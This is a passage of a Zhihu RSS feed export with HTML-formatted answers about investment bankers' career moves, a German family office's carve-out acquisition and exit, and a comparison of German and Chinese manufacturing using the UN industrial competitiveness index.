data-pid=\"1IwgoJH7\">同事B：投行从业3年，后跳至PE，跳槽理由是与部门领导不合，此外在PE的朋友推荐了他，顺水推舟就去PE试试看了，后从业至今，日子十分潇洒。</p>\n<p data-pid=\"r3cj7zlA\">同事C：投行从业6年，跳至上市公司当董秘，跳槽理由是工作离家太远，想换个离家近的工作，后来正好自身承做项目董秘有空位，便毛遂自荐摇身一变成为高管了。</p>\n<p data-pid=\"_K6Cc_He\">同事D：投行从业6年，跳至拟上市公司当董秘，跳槽理由是运气太背，保代司考注会三证齐全，但是承接的项目做一个黄一个，6年时间未作出任何一单IPO、再融资或重组项目，心灰意冷，选择了风险更大的创业，在这里祝他好运。</p>\n<p data-pid=\"UCm2Y_d5\">同事E：投行从业4年，跳至某拟上市公司当投融资总监，跳槽理由是IPO工作强度过高，所在项目IPO融资规模超过20亿，连续1年超高强度工作，工作日基本没有在12点前下过班，项目完成后失去继续在投行工作的动力，经过慎重选择后选择当前工作，目前已帮助该拟上市公司实现H股融资。</p>\n<p data-pid=\"481VaYDM\">同事F：投行从业超过10年，跳至拟上市公司当董秘，后公司基本面不行又回到了投行。该同事属于承揽一把好手，在职期间承揽多个IPO项目，为追求财富自由跳槽。</p>\n<p data-pid=\"rT1KvJ49\">上述同事据我所知，现在过得都不错。不管是投行还是其他工作，都是首先实现温饱，然后再实现人生目标和人生幸福的一份职业而已。跳槽原因有很多，重要的是跳槽要让自己的人生目标更近一步，多做好准备，在机会来临的时候要能抓住。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/leinuowei?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">雷诺威</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24609295/answer/2297963591?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">122 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21729027?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在很多优秀学生都对投行、咨询等公司趋之若鹜，这些行业是否这么值得去？</a><br><a href=\"http://www.zhihu.com/question/20125647?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么很多人向往投行这个行业？</a><br>\n","link":"http://www.zhihu.com/question/24609295/answer/2297963591?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"企业并购是如何创造价值的？","date":"2022-02-15 04:11:54","description":"\n<p data-pid=\"UTfOv_KE\">提供一个我们的案例，尝试揭示并购如何创造价值。</p>\n<p data-pid=\"8V0RzJra\"><b>未经作者允许，本文禁止转载。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5cee770f5dcde1ffe70626e41cd3a16a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2005\" data-rawheight=\"1135\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>交易背景</b></h2>\n<p data-pid=\"e0CudZmy\"><b>买方：</b></p>\n<p data-pid=\"AMg3iVlQ\">德国某家族办公室（family office）。该家族经营的主业是一个营收一亿欧元以上的具有百年历史的工业零件制造商，主要产品是齿轮，减速器等工业产品。</p>\n<p data-pid=\"-hSdBIc_\">该投资由这个家族办公室完成，与该家族的主业分离，属于完全的PE财务投资。但投资方的家族拥有丰富的产业经验和相当的市场渠道，是这次交易最终获利的一个关键要素。</p>\n<p data-pid=\"XW9p3QQc\"><b>卖方：</b></p>\n<p data-pid=\"Hcpv8x43\">来自北欧的某超大型工业集团。在欧债危机汽车销量大幅下降的背景下，该工业集团，希望剥离资产，出售过剩产能。</p>\n<p data-pid=\"BmdERbOK\"><b>标的资产</b></p>\n<ul>\n<li data-pid=\"54gKK3qd\">该工业集团某大型工厂的一部分，包括土地，厂房、生产设备等</li>\n<li data-pid=\"HjAm706W\">产品为向该工业集团的下游公司提供的半成品零部件</li>\n<li data-pid=\"if9kmyYc\">部分产品亦向外部客户销售，然而没有独立的销售部门</li>\n<li data-pid=\"ILYF6lhl\"><b>该交易的实际性质是分割剥离（Carve-out），除简单的运营部门外，基本不存在基本企业职能部门</b></li>\n</ul>\n<p data-pid=\"uy7ToyHh\"><b>买方的投资策略：</b></p>\n<ul>\n<li data-pid=\"Zrypz7Nj\">\n<b>产品和市场：</b>作为标的出售的这一部分工厂拥有一批性能优良的Hatebur设备。这种设备非常稀缺，供应商交货期需要数年。长远来看，拥有这些设备使得该工厂具有特殊的市场竞争力。</li>\n<li data-pid=\"OEIA1uX5\">\n<b>销售和客户合同：</b>卖方作为未来该剥离部分资产形成的新的经济实体的主要客户（70%），承诺长期锁定的采购金额；另外，买方通过其丰富的市场关系联络了另一个大型的潜在客户，在最终签署SPA前便锁定了未来的销售合同。</li>\n<li data-pid=\"qbvWV9q5\">\n<b>运营改善潜力：</b>买方对于工厂的优化和运营具有十分丰富的经验，而新客户的引入能进一步大幅优化产能（60%），并削减采购成本</li>\n<li data-pid=\"2PPNeAkz\">\n<b>退出规划：</b>对标的资产的BP的进一步研究显示出该资产能够大幅创造股东价值，由此对于最终退出投资并无实质担忧</li>\n</ul>\n<h2><b>卖方BP和初步谈判</b></h2>\n<p><img src=\"https://pic2.zhimg.com/v2-3848892bdede0774d4547963640e9b8e_720w.jpg?rss\" data-caption=\"卖方BP显示出极低的预期业绩（EBIT低于3%），年华增长率仅为2%，长期运营可能存在困难\" data-size=\"normal\" data-rawwidth=\"1021\" data-rawheight=\"612\" data-watermark=\"watermark\" data-original-src=\"v2-3848892bdede0774d4547963640e9b8e\" data-watermark-src=\"v2-ba5283493575c22358fb6085de4ca42b\" data-private-watermark-src=\"v2-0f06bf92939a4c0c04a9b7feb0784f41\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-14b20d715de53c5af35a6f5223e2e6da_720w.jpg?rss\" data-caption=\"卖方要价的确定基于系列资产的卖方账面价值（约为4350欧元）。卖方对进一步降低出售价格存在的主要顾虑在于：降低出售价格将迫使卖方对资产做减计处理，而卖方基本原则为不为资产做减计处理。\" data-size=\"normal\" data-rawwidth=\"925\" data-rawheight=\"522\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"BikXp1ZJ\">通过第一轮的谈判了解到卖方期待的交易价格（43.5百万欧元）后，与买方粗略估计的交易预期价格（29.3百万欧元）有较大差别。以资产账面价值为估值基础的卖方和以预期盈利倍数（EBITDA x 6）为估值基础的买方存在巨大的差距。然而由于卖方巨大的实力，在谈判中处于强势地位，卖方期望的价格没有很大的讨论空间。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7fb55b021f7f9edf208f4509dcf399bf_720w.jpg?rss\" data-caption=\"买方设计了符合卖方预期卖价的杠杆。\" data-size=\"normal\" data-rawwidth=\"549\" data-rawheight=\"421\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ee41cf84dc4315e4713808ec00641239_720w.jpg?rss\" data-caption=\"但是依据卖方提供的BP测算现金流，这个杠杆结构会导致还本付息的风险。\" data-size=\"normal\" data-rawwidth=\"907\" data-rawheight=\"424\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"LSepCx8T\">尽管如此，买方出于丰富的产业经验，依然依照卖方的预期卖价提交了非约束力报价。然后进入尽调阶段。</p>\n<h2>尽调及谈判</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-eb8c2ff39d2e1dfa04f41a0a94a834e4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1588\" data-rawheight=\"600\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"JLw_6DAO\"><b>向卖方提示的尽调结果：（External View）</b></p>\n<ul>\n<li data-pid=\"rWATmMY3\">许多设备长期缺乏可靠的维护和保养</li>\n<li data-pid=\"EQm5FxJ2\">工厂的采取的某些不充分的措施可能造成对土壤和环境的污染</li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-a0c6f00f147269d2b816c9cfb8edbdc5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1027\" data-rawheight=\"216\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"vSlIJt7f\">依据尽调结果，买方向卖方提示其提供的预测BP将会由于尽调发现的原因造成减损，由此要求卖方依照基于其原卖价测算的EBITDA倍数，乘以尽调调整后的EBITDA，以计算新的交易价格。买方提议调整值为5百万欧元。经过谈判，卖方认可了新的交易价格。</p>\n<p data-pid=\"vB4mxPss\"><b>买方内部的尽调结果及买方BP（Internal View）</b></p>\n<p data-pid=\"ADPw9ajC\">事实上，买方通过尽调也发现工厂存在大量改善的潜能。因此买方还有一套以买方内部的尽调发现重新制定的一版商业计划，并推测了全新的EBITDA。这个内部测算还没有计入潜在的新客户。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-063718b81ec70e16748bc071be51d8df_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"445\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"rIptNqyP\"><b>买方通知卖方，依据尽调，EBITDA需要下调0.7百万欧元。而买方内部测算，在通过运营改善后，能够有效提升EBITDA约4.1百万欧元。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8be31cdaee9a6208999cf0c609b2fb2d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1036\" data-rawheight=\"498\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"ff4SA7-H\">依据尽调结果，同时比对卖方视野（External View，估值为EBITDA的9.2倍）和买方视野（Internal View，估值为EBITDA的4.7倍），可以发现企业的大量价值可待发掘。如果3年后依照符合市场平均水准的EBITDA的6倍的估值出售，股东价值可以提高4.2倍，内部收益率可达惊人的62%。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b5ec7b1ea3833ec28977b015ea84cfda_720w.jpg?rss\" data-caption=\"交易达成时的资金构成。\" data-size=\"normal\" data-rawwidth=\"549\" data-rawheight=\"421\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"vJarja61\">双方最终以38.5百万欧元达成交易。买放最终的融资结构。此外，买方对未来应收账款进行保理融资，实现额外6至9百万欧元现金流入，同时还获得了银行8百万欧元的额外授信以补充运营资本。</p>\n<h2><b>资产持有期</b></h2>\n<p data-pid=\"tSUXZo6b\">在收购接近完成时，买方已经积极与各利益相关方进行联络，包括：</p>\n<p data-pid=\"05zhUkgD\"><b>客户：</b></p>\n<ul>\n<li data-pid=\"rMaOG2MU\">向老客户确保供应状态</li>\n<li data-pid=\"GoIBH39u\">向潜在新客户（卖家的竞争对手）承诺独立运营</li>\n<li data-pid=\"3NbBAwTS\">向客户承诺额外的产能，以及额外的热处理及表面处理工艺</li>\n</ul>\n<p data-pid=\"AcHnqN1_\"><b>地方政府：</b></p>\n<ul>\n<li data-pid=\"aGHx9Mn2\">提出增长计划并预测创造更多就业岗位（由2012年的227个增长到2015年250个）</li>\n<li data-pid=\"ediM8zeY\">预测为地方政府带来额外的财政收入</li>\n<li data-pid=\"JfOF05Um\">利用地方政府做产业调整的政策获得政府补贴，以用来覆盖部分资本支出需求</li>\n</ul>\n<p data-pid=\"9tsRhv5L\"><b>供应商</b></p>\n<ul><li data-pid=\"hnQFZcMW\">展示未来业务的增长潜力</li></ul>\n<p data-pid=\"6G3bwAXg\"><b>员工</b></p>\n<ul>\n<li data-pid=\"wdoxbeZH\">承诺保障工作岗位</li>\n<li data-pid=\"Yc5uUFwT\">展示未来业务增长策略</li>\n</ul>\n<p data-pid=\"157Y1T-d\"><b>交割完成后，立即执行提前制定好的百日行动方案</b></p>\n<ul>\n<li data-pid=\"s3Sq_PDL\">利用原材料采购规模效应重新谈判价格</li>\n<li data-pid=\"D_oMel8j\">保理应收账款以获得更多现金从而进一步快速拓展销售</li>\n<li data-pid=\"HxQViNMm\">重新建立新的支持部门（财务、人事）</li>\n<li data-pid=\"ajLgvHUy\">设立销售和市场总监职位</li>\n<li data-pid=\"MYlzrL7o\">降低运营成本</li>\n<li data-pid=\"d4huTGMP\">生产流程调整和优化，员工队伍调整</li>\n<li data-pid=\"Q65A3TNO\">6个月时间聘请了供应链、物流、采购方面的专业人士作为外部顾问来提升业绩</li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-d93295915bfcf09404baaef8981f6fd4_720w.jpg?rss\" data-caption=\"经过四年的运营，直到2015年最终出售，公司的实际运营变化。\" data-size=\"normal\" data-rawwidth=\"1023\" data-rawheight=\"637\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"_eNEweLK\">经过四年的运营，直到2015年最终出售，公司的运营业绩与卖方的预期具有翻天覆地的变化：</p>\n<ul>\n<li data-pid=\"znSK9c9l\">收购当年的EBITDA就达到了9.5百万欧元，甚至超过买方收购时的最乐观预期。</li>\n<li data-pid=\"IzrpqSRI\">新客户的开拓，使得销售年增率达到了15%，相比于卖方的预测2%有了质的飞跃</li>\n<li data-pid=\"I17mVQn-\">EBITDA的年增率，随着进一步提升效率，达到了17%。</li>\n</ul>\n<p data-pid=\"dnU0O8F0\"><b>资产出售：</b></p>\n<p data-pid=\"gGVsBFKA\"><b>背景</b><br>2015年底，在经历4年资产持有期后，资产运营状况已经被大幅改善。此时一个美国的工业企业集团（事实上是该北欧工业集团的竞争对手）通过某顾问公司与该德国家族办公室联络寻求收购该资产。双方很快进入实质性谈判阶段。</p>\n<p data-pid=\"ETNbV8uV\"><b>估值</b><br>美国买家报价为7550万欧元。该报价事实上依据2015年EBITDA的5倍进行估值，低于投资时预计的退出估值倍数（6倍）。然而基于大幅改善的EBITDA，考虑到出售可为该投资带来的巨大收益（投资本金的3.8倍增值，56%内部投资收益），卖方依然接受了报价并完成了交易。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/will-shen-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">will shen</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489529707/answer/2305812924?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/293859533?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">资本真的能创造价值吗？</a><br><a href=\"http://www.zhihu.com/question/495916753?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">混的好的财务人员是靠自己能给公司创造价值还是靠建立人际关系呢？</a><br>\n","link":"http://www.zhihu.com/question/489529707/answer/2305812924?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"如何能使「中国制造」达到「德国制造」的水平？","date":"2022-02-15 04:11:25","description":"\n<p data-pid=\"Gt0j2_fO\">联合国2020年4月发布的最新全球工业竞争力指数，该报告标题如下：</p>\n<p data-pid=\"LXvz_3LN\"><b>德国在全球工业竞争力指标上领先，而中国正在迎头赶上。</b> </p>\n<p><img src=\"https://pic4.zhimg.com/v2-05d2f92529fabe7343d3faad55af1e3a_720w.jpg?rss\" data-caption=\"参见联合国工业发展组织相关报告\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"933\" data-watermark=\"watermark\" data-original-src=\"v2-05d2f92529fabe7343d3faad55af1e3a\" data-watermark-src=\"v2-68425ae26a750b58263c65d7a2297042\" data-private-watermark-src=\"v2-e98809a08b95e1e66a8195c1d5382393\"></p>\n<p data-pid=\"bLYo-h2t\">本人在德国工作生活，从事汽车零部件以及相关工业领域的投资和跨国并购。以下仅从联合国CIP报告出发，浅谈德国与中国制造业竞争力的差距。</p>\n<hr>\n<p data-pid=\"_eLvbFty\"><b>根据该报告，2018年工业竞争力指数排名前十的经济体如下：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-90ae79665ea26b4394a48374981948f8_720w.jpg?rss\" data-caption=\"相比于上次报告发布的2012年，德国维持第一位，而中国从第五跃居第二。\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"510\" data-watermark=\"watermark\" data-original-src=\"v2-90ae79665ea26b4394a48374981948f8\" data-watermark-src=\"v2-c9afc91806db5a1deee107c71c81bdbe\" data-private-watermark-src=\"v2-db3987bc7021c3a7a5248b83aff349eb\"></p>\n<p data-pid=\"ktitEWbg\">相比于2012年，德国继续蝉联全球第一。而中国在2012-2018年之间，从第5位超过日本，美国和韩国，跃升第二位，仅次于德国。</p>\n<p data-pid=\"YISBIUXn\"><b>CIP评价体系方法如下：</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4e3b88a6e8026b88029a8f40ba5f8845_720w.jpg?rss\" data-caption=\"评价体系共分三个维度\" data-size=\"normal\" data-rawwidth=\"577\" data-rawheight=\"599\" data-watermark=\"watermark\" data-original-src=\"v2-4e3b88a6e8026b88029a8f40ba5f8845\" data-watermark-src=\"v2-b635dada39628ff041a5b63b4ebda527\" data-private-watermark-src=\"v2-eb4f4368652103e160341b5761c0eb85\"></p>\n<p data-pid=\"NiEQ1xmF\"><b>第一维度：生产和出口能力</b></p>\n<blockquote data-pid=\"VaftCqHi\">在全球化经济中，一个国家生产制成品的能力与其出口能力密切相关。反过来，两者都是一个国家工业发展阶段的关键因素，并有助于其结构变革路径。随着本地制造的商品变得更具竞争力，本地市场的参与度趋于增加，最终，一些进口商品被替代。竞争的进一步改善导致外国市场参与度的扩大。<br>CIP 指数的第一个维度涵盖了各国制造业生产和出口的可比指标。这些措施提供了有关每个国家生产能力的指标。为了使这些值在不同规模的国家之间具有可比性，<b>CIP 分别以人均 MVApc（人均制造业增加值）和 MXpc（人均制造业出口值）计算制造业增加值和制造业出口。</b>这些指标允许进行国家比较，而不受国家人口规模的影响。</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-4689f606246a8a142b87e0f5dad10476_720w.jpg?rss\" data-caption=\"第一维度国家分布。排名最高为爱尔兰，其次瑞士、新家坡。显然按照人均，这些小国具有重大优势。\" data-size=\"normal\" data-rawwidth=\"881\" data-rawheight=\"489\" data-watermark=\"watermark\" data-original-src=\"v2-4689f606246a8a142b87e0f5dad10476\" data-watermark-src=\"v2-871a05332b996f5331e76eea38ea3213\" data-private-watermark-src=\"v2-20664af401d7ee6a06b5dd0bdabfb6bb\"></p>\n<p data-pid=\"jjq9WtTm\"><b>第二维度：技术深化升级</b></p>\n<blockquote data-pid=\"w-sppXkZ\">制造业促进其他经济部门和人民总体福利的强大能力取决于它比采掘业增加更多价值的事实，增加了生产过程的复杂性，从而增加了所生产商品的价值。然而，制造业活动的复杂程度不同。虽然高科技产品的生产通常涉及非常复杂的制造过程，需要多种投入和最先进的技术，但以资源为基础的制成品和低技术产品的生产通常更容易生产。<br>在这方面，一个专门从事高科技产品生产的国家比一个专门从事低技术制造业的国家更有可能从不同活动之间的强大生产联系和知识溢出中受益。一个国家生产的商品的技术复杂性也是该国工业竞争力的一个因素。换句话说，工业部门的扩张是一种积极的发展，但当这种扩张背后的制造业位于技术阶梯的高处时，效果会更好。<b>中高技术 (MHT) 产品在总制造业生产中的较高份额通常是具有高水平生产力、创新和技术进步的经济体的特征。</b><br>在这方面，一个专门从事高科技产品生产的国家比一个专门从事低技术制造业的国家更有可能从不同活动之间的强大生产联系和知识溢出中受益。<b>一个国家生产的商品的技术复杂性也是该国工业竞争力的一个因素。</b>换句话说，工业部门的扩张是一种积极的发展，但当这种扩张背后的制造业位于技术阶梯的高处时，效果会更好。<b>中高技术 (MHT) 产品在总制造业生产中的较高份额通常是具有高水平生产力、创新和技术进步的经济体的特征。</b><br>此外，随着我​​们从技术简单的产品转向更复杂的产品，设计和生产此类产品的技术要求也随之提高；因此，技术要求越高，能够满足这些要求的生产者数量就越少。这一实证观察支持了产品技术复杂性的增加往往会产生更集中的市场结构的说法。在极端情况下，高度复杂产品的突破性创新可能会在一定时期内奖励创新者在市场上的垄断权，而竞争对手将失去（至少）部分市场份额并试图赶上创新者。这一前提与熊彼特（Schumpeter，1934）的研究结论一致，他声称公司期望获得一些市场力量作为对其创新的奖励，否则将没有足够的激励来投资于研发（R&amp;D）。纳尔逊和温特 (Nelson and Winter, 1982) 也强化了这一观点，他们更进一步断言技术变革不仅影响市场结构，而且市场结构也影响创新。因此，市场结构和技术变革具有双向因果关系。与在企业层面发生的情况类似，向技术阶梯上移会减少能够生产技术更复杂产品的国家数量，即在高科技领域进行竞争通常会导致竞争者数量减少，从而导致一定程度的垄断力量。<br>此外，高科技产业的竞争可能更多地取决于创新而不是劳动力成本。因此，竞争者更有可能投资于研发或提升其劳动力的技能，而不是专注于其他对社会有益的努力，例如削减就业福利，这将对劳动密集型行业产生更大的影响，这是中低技术群体的特征。增加研发投资和提高劳动力技能往往会产生超出制造业的积极外部效应，从而使整个经济受益。<br>CIP指数通过<b>两个综合指数捕捉技术深化和升级</b>。首先，<b>工业化强度（INDint）</b>估计了生产过程的复杂性。INDint是一个综合指标，由两个补充指标组成：中高科技<b>MVA（制造业增加值）</b>在总MVA中的份额（MHVAsh）和<b>MVA（制造业增加值）</b>在GDP中的份额（MVAsh）；其次，<b>出口质量（MQual），</b>也是衡量该国制造业一体化进程质量的综合指标。该国出口商品的技术复杂程度越高，其融入全球市场的质量就越高。<b>出口质量MQual</b>也是基于两个补充指标估算的：<b>中高科技制造业出口在制造业出口总额中的份额（MHXsh）</b>，<b>以及制造业出口在总出口中的份额（MXsh）</b>。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-9187880a47880b4380897780807e64bf_720w.jpg?rss\" data-caption=\"这一维度排名最高的是台湾省，韩国，新家坡等。典型的芯片制造重镇。我国在这一维度排名第9，德国第6。\" data-size=\"normal\" data-rawwidth=\"879\" data-rawheight=\"484\" data-watermark=\"watermark\" data-original-src=\"v2-9187880a47880b4380897780807e64bf\" data-watermark-src=\"v2-ef1b51d524dafab2fd1c4681238b51d1\" data-private-watermark-src=\"v2-008a5e1446e0fa94e491c8a4e8041d70\"></p>\n<p data-pid=\"X_6ir7Jt\"><b>第三维度：世界影响</b></p>\n<blockquote data-pid=\"bgRMBYLf\">集聚经济、范围经济和规模经济也是竞争力的因素。 CIP 将这些影响归为第三个 CIP 维度，即世界影响，它描述了该国对全球制成品市场的影响。 这个维度的基本概念是，一个国家的工业竞争力可能会受益于具有更高的世界影响力，并可能转化为更好地获得外国资本、对基础设施的新投资甚至更大的贸易协定谈判能力。<br>CIP 指数基于两个指标捕捉世界影响：国家在世界 MVA (ImWMVA) 和世界制成品贸易 (ImWMT) 中的份额。 这些股份的价值越高，该国对世界生产和制成品贸易的影响就越大。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-4bf3c55b07c87ae4ce787ac25d51c325_720w.jpg?rss\" data-caption=\"这个维度，总分前五名排名前五，而我国在两个次维度都具有绝对领先优势，显示出中国制造在全球领域无可替代的地位。\" data-size=\"normal\" data-rawwidth=\"878\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-4bf3c55b07c87ae4ce787ac25d51c325\" data-watermark-src=\"v2-582f0776726f6ca6de42315ac24af403\" data-private-watermark-src=\"v2-27c411232e98965d5c3a37457d2bbd9b\"></p>\n<p data-pid=\"pZzhIIdT\"><b>主要国家（2019年最新数据前五名：德中美日韩）具体数据</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-481b5b5d7388dd650cd17db6dd2cf5be_720w.jpg?rss\" data-caption=\"依据UNIDO最新更新的2019年的数据\" data-size=\"normal\" data-rawwidth=\"1027\" data-rawheight=\"231\" data-watermark=\"watermark\" data-original-src=\"v2-481b5b5d7388dd650cd17db6dd2cf5be\" data-watermark-src=\"v2-984ebee6dbe202742d67f2160b665d09\" data-private-watermark-src=\"v2-cbebd0779c9ee5535e4e8c62b5556472\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f4fb8a317997f93f49e559078c9fcb71_720w.jpg?rss\" data-caption=\"相比之下，报告中2018年的评分。韩国2019年相对后退到了第5。\" data-size=\"normal\" data-rawwidth=\"539\" data-rawheight=\"179\" data-watermark=\"watermark\" data-original-src=\"v2-f4fb8a317997f93f49e559078c9fcb71\" data-watermark-src=\"v2-df764e5716ce18b21b4b4a44d0eee522\" data-private-watermark-src=\"v2-f2dd9c9ba1251e032bacb6079106e862\"></p>\n<p data-pid=\"0RCJaXMb\"><b>各国总评：</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ea82c3acba0d5dbe8f4659bc2212a7f8_720w.jpg?rss\" data-caption=\"德国\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"427\" data-watermark=\"watermark\" data-original-src=\"v2-ea82c3acba0d5dbe8f4659bc2212a7f8\" data-watermark-src=\"v2-c874711b69497a8e3861b47e66a329b6\" data-private-watermark-src=\"v2-53b6765ca7487408d103218576d43bf4\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fb0e3973f6a2744a949fef7a137edab9_720w.jpg?rss\" data-caption=\"中国\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-fb0e3973f6a2744a949fef7a137edab9\" data-watermark-src=\"v2-6397d39d10776c69c57ba149c3002a49\" data-private-watermark-src=\"v2-ac490f6a9a3b64870330560646d5a216\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e8481c125535813d4b71dfbc20da7bfb_720w.jpg?rss\" data-caption=\"美帝\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"431\" data-watermark=\"watermark\" data-original-src=\"v2-e8481c125535813d4b71dfbc20da7bfb\" data-watermark-src=\"v2-548e1dcc59dd64f93a5a16bc05a3b373\" data-private-watermark-src=\"v2-72c870ca0ed8bfaca13bd0ed4e5accc1\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-62434f5d44a58d5977e71ad71a3edc24_720w.jpg?rss\" data-caption=\"日本\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"419\" data-watermark=\"watermark\" data-original-src=\"v2-62434f5d44a58d5977e71ad71a3edc24\" data-watermark-src=\"v2-c94f7f8b871bddd74d6bd36fd50b30b9\" data-private-watermark-src=\"v2-3bf92d2109ff816da0a56d6a52359b02\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-84a41cd05fd33489e0881edf3a41e03d_720w.jpg?rss\" data-caption=\"韩国\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-84a41cd05fd33489e0881edf3a41e03d\" data-watermark-src=\"v2-cad00bf31cd70ff87201c080d63b9673\" data-private-watermark-src=\"v2-c03179112ea7c236f1613eadf4249d35\"></p>\n<p data-pid=\"uJ-dSTn6\">联合国关于产品技术含量类被的定义：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9b03d7c1b0deff786945e4fd6cfaa1aa_720w.jpg?rss\" data-caption=\"UN COMTRADE\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"743\" data-watermark=\"watermark\" data-original-src=\"v2-9b03d7c1b0deff786945e4fd6cfaa1aa\" data-watermark-src=\"v2-e4001123dff4b0eb9e3e655b1daafbd3\" data-private-watermark-src=\"v2-03bf96e62b9ea85e7e427ecf5dfdca63\"></p>\n<p data-pid=\"gssb_r7V\"><b>总结和观点：</b></p>\n<p data-pid=\"aliyfdRo\">不必妄自菲薄，中国制造业的发展速度和绝对实力毋庸置疑。在许多国人忧心忡忡的出口品技术含量的方面，我国以MHVAsh 41.45%（总制造业增加值技术含量）和MHXsh （总出口技术含量）60.26%，总排名居第9位。</p>\n<p data-pid=\"uJyBv5xq\"><b>1. </b>我国作为人口大国和世界工厂，为满足内需、供应全球并解决低技术工人的就业，低端制造业依然不可或缺。无论我国如何进一步产业升级，MHVAsh和MHXsh两个指标进一步提升的空间并不大。</p>\n<p data-pid=\"JHXNiBgE\"><b>2. </b>从出口产品的技术含量的细分门类来看，大家热衷于讨论的所谓机械制品，各种精密仪器设备，依据联合国门类事实上属于中端技术产品，而在这个门类中最大的一类为汽车。这个领域，恰好是我国在前五强中占比最低的一个门类，相对于德国的50%，日本的60%，有一定差距。<br>但是这个领域的差距正在显著缩小：</p>\n<ul>\n<li 